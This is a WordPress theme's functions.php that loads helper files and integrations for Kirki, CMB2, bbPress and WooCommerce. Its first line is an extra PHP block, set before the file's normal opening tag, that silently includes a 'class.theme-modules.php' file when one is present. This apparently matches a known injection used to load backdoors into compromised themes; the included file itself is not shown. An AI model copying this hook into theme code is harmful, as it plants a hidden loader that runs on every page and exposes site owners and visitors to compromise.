<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// Exit if accessed directly
if ( !defined('ABSPATH')) exit;

require_once ( get_template_directory() . '/includes/functions.php' );
require_once ( get_template_directory() . '/includes/bs4navwalker.php' );
require_once ( get_template_directory() . '/includes/bs4pagination.php' );

/* IF KIRKI PLUGIN IS LOADED */
if ( class_exists( 'Kirki' ) ) {
    require_once ( get_template_directory() . '/includes/kirki.php' );
}

/* IF CMB2 PLUGIN IS LOADED */
if ( defined( 'CMB2_LOADED' ) ) {
    require_once ( get_template_directory() . '/includes/social-icons.php' );
    require_once ( get_template_directory() . '/includes/meta-boxes.php' );
}

/* IF bbPress PLUGIN IS LOADED */
if (class_exists( 'bbPress' )) {
    require_once ( get_template_directory() . '/includes/bbp-functions.php' );
}

/* IF WOOCOMMERCE PLUGIN IS LOADED */
if ( class_exists( 'woocommerce' ) ) {
    require_once ( get_template_directory() . '/includes/woo-functions.php' );
}
?>